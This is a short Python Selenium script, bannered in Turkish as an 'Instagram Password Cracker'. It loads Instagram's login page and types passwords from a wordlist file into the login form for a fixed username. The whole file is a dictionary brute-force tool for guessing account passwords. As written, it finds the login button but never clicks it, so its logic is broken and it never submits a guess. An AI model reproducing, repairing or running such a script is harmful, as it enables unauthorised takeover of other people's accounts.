from  selenium import webdriver
from time import sleep
print("""


#######################################################
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#               Instagram Şifre Kırıcı                #
#                                                     #
#                   Hoşgeldiniz                       #
#                                                     #
#-----------------------------------------------------#                                                  
#                                                     #
#                                                     #
#                                                     #
#                                                     #
#                                                     #
#                      Lisans:v1                      #
#				                      #
#                                                     #				   
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#######################################################

 """)

sleep(5)

#Chrome için gerekli olan kısmını kurduk yani driveri
chromepath = "C:\\Users\\omerk\\Desktop\\chromedriver.exe"
browser = webdriver.Chrome(executable_path=chromepath)

#URL'yi bağladık
browser.get('https://www.instagram.com/accounts/login/')
sleep(4)

#Giris yapacagımız kısıma geldik

login_username=browser.find_element_by_xpath('/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[1]/div/label/input')
login_password=browser.find_element_by_xpath('/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[2]/div/label/input')
login=browser.find_element_by_xpath('/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[3]')


dosya = open( 'instagram_wordlist.txt', 'r',encoding="utf-8")
for satir in dosya:
    login_username.send_keys('oomer')
    sleep(3)
    login_password.clear()  
    login_password.send_keys(satir)
    sleep(2)
    login_username.clear()  
dosya.close()
sleep(7)
browser.close()




